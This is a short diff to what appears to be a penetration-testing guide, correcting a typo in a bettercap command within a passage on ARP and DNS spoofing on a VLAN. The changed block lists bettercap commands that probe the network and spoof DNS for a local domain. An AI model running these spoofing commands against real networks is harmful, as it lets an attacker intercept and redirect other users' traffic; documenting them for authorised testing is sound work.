@@ -43,7 +43,7 @@ ifconfig eth0 inet6 add fe80::200:f8ff:fe21:67cf/64
 You can end up using an **ARP & DNS attack Spoof**, which will always work if there is user traffic in the vlan:
 
 ```
-./bettercap-iface eth0
+./bettercap -iface eth0
 net.probe on
 set dns.spoof.domains jaki.local
 dns.spoof on
